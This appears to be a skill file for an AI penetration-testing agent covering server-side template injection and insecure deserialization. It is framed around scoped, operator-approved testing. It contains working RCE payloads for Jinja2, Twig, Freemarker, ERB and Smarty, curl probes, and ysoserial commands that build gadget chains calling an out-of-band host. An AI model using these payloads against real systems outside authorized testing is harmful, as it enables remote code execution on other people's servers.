---
name: web-ssti-deser
description: Use when input hits a template engine or a serialized object — per-engine SSTI detection and insecure-deserialization safe PoC. Classes ssti/deser.
---

# Server-side template injection & insecure deserialization

Both often reach RCE, so prove capability with the **least intrusive** payload (arithmetic eval for SSTI; an OOB ping for deser) and gate anything beyond a benign proof behind operator approval. Stay in scope.

Per candidate: `record kind=hypothesis ... class=ssti|deser outcome=testing`.

## SSTI (class=ssti, CWE-1336 / CWE-94)
### Detect with a polyglot, then fingerprint the engine
```bash
# does the app evaluate expressions? {{ }} and ${ } are the tells
curl -s "https://TARGET/p?name=\${7*7}"          # -> 49  => Freemarker/Velocity/JSP-EL
curl -s "https://TARGET/p?name={{7*7}}"          # -> 49  => Jinja2/Twig/Nunjucks/Angular
curl -s "https://TARGET/p?name={{7*'7'}}"        # 7777777 => Jinja2 ; 49 => Twig
```
`49` (or `7777777`) reflected = code is evaluated, not just echoed. Reflection of the literal `{{7*7}}` = **not** SSTI.

### Per-engine escalation (confirm, don't rampage)
- **Jinja2 (Python):** `{{ config }}` / `{{ ''.__class__.__mro__[1].__subclasses__() }}`; RCE via `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
- **Twig (PHP):** `{{ _self }}`; `{{ ['id']|filter('system') }}` (older) or `{{ ['id']|map('system')|join }}`.
- **Freemarker (Java):** `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- **Velocity (Java):** `#set($e="e")$e.getClass().forName("java.lang.Runtime")...`
- **ERB (Ruby):** `<%= system("id") %>` / `<%= `id` %>`.
- **Smarty (PHP):** `{system('id')}` / `{php}...{/php}`.
Least-intrusive proof = `id`/`whoami` output or a `sleep`/OOB callback; do not run destructive commands.

## Insecure deserialization (class=deser, CWE-502)
### Recognize the sink
- **Java:** base64 blobs starting `rO0AB` (magic `ac ed 00 05`); params/cookies named `viewstate`, `session`, `state`; `readObject`. Also `ViewState` (.NET), Kryo, Hessian, JMS.
- **PHP:** `unserialize()` on user input; strings like `O:8:"stdClass"...`; magic methods `__wakeup`/`__destruct` (POP chains); `phar://` deserialization.
- **Python:** `pickle.loads`, `yaml.load` (unsafe), `jsonpickle`; base64 pickle blobs.
- **Ruby:** Marshal, unsafe YAML (`Psych.load`).
- **Node:** `node-serialize` (`_$$ND_FUNC$$_`), `funcster`, unsafe `eval`-based parsers.
- **.NET:** `BinaryFormatter`, `LosFormatter`/ViewState (`__VIEWSTATE`), `Json.NET TypeNameHandling`.

### Safe confirmation
```bash
# Java gadget chains — generate a benign OOB/DNS payload, not a reverse shell:
ysoserial CommonsCollections5 'nslookup OOB_ID.oast.pro' | base64 -w0
# .NET:
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "nslookup OOB_ID.oast.pro"
```
- Prove execution with a **DNS/HTTP callback** (OOB) or a timing sleep — the cleanest non-destructive proof for a blind sink. A decode/format-match alone is a strong hypothesis, not a confirmed finding.
- Detecting the format ≠ exploitable: confirm the payload actually deserializes with a gadget present. Missing gadgets → record as an `inconclusive` hypothesis, not a finding.

## Wire into the loop
```
record kind=hypothesis statement="name param is Jinja2 SSTI" target=e6 class=ssti approach="{{7*7}} and {{7*'7'}} differential" outcome=confirmed evidence=evidence/ssti.txt
record kind=finding title="SSTI (Jinja2) → RCE via name param" severity=critical target=e6 class=ssti cwe=CWE-94 status=confirmed hypothesisId=y5 evidence=["evidence/ssti-id.txt"]
record kind=finding title="Insecure Java deserialization on /state cookie" severity=critical target=e9 class=deser cwe=CWE-502 status=confirmed hypothesisId=y7 evidence=["evidence/deser-oob.txt"]
```
Severity: confirmed RCE = critical; eval/read-only template context = high; format present but unproven = keep as hypothesis (no finding yet).
